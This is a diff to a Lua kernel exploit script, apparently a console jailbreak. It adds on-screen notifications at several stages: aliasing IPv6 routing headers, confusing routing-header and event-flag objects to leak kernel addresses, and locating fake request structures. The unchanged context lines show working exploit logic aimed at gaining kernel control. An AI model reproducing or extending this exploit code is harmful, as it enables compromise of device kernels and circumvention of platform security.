@@ -773,6 +773,7 @@ function make_aliased_rthdrs(sds)
             if marker ~= i then
                 local sd_pair = { sds[i], sds[marker] }
                 printf("aliased rthdrs at attempt: %d (found pair: %d %d)", loop, sd_pair[1], sd_pair[2])
+                send_ps_notification("aliased rthdrs at attempt: " .. loop)
                 table.remove(sds, marker)
                 table.remove(sds, i) -- we're assuming marker > i, or else indexing will change
                 free_rthdrs(sds)
@@ -1033,6 +1034,7 @@ function leak_kernel_addrs(sd_pair, sds)
 
         if evf ~= nil then
             printf("confused rthdr and evf at attempt: %d", i)
+            send_ps_notification("confused rthdr and evf at attempt " .. i)
             break
         end
     end
@@ -1138,6 +1140,7 @@ function leak_kernel_addrs(sd_pair, sds)
 
         if reqs2_off and fake_reqs3_off then
             printf("found reqs2 and fake reqs3 at attempt: %d", i)
+            send_ps_notification("found reqs2 and fake reqs3 at attempt " .. i)
             fake_reqs3_sd = sds[sd_idx]
             table.remove(sds, sd_idx)
             free_rthdrs(sds)
@@ -2093,6 +2096,5 @@ function kexploit()
     pin_to_core(prev_core)
     set_rtprio(prev_rtprio)
 end
-
 
 kexploit()
